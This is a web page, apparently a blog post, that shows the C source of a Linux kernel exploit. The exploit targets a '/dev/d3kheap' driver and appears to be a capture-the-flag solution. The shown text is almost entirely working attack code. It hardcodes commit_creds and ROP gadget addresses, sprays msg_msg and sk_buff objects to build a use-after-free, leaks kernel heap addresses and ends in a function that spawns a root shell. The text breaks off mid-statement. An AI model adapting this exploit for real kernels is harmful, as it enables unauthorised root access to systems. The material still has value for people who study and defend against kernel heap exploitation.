class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ADD     0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_EDIT    0x4321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SHOW 0xbeef</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_DEL     0xdead</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FREE_PIPE_INFO 0xffffffff81327570</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_R14_POP_RBP_RET 0xffffffff81003364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_RSI_PTR 0xffffffff8105acec</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_ADD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_DEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get a free object</span></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1024</span>)</span><br><span class="line">            del();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger UAF...&quot;</span>);</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to mark the UAF msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find out the UAF queue</span></span><br><span class="line">    victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * the msg_msg got changed, so we can&#x27;t read out</span></span><br><span class="line"><span class="comment">         * but it tells us which one the victim is</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span 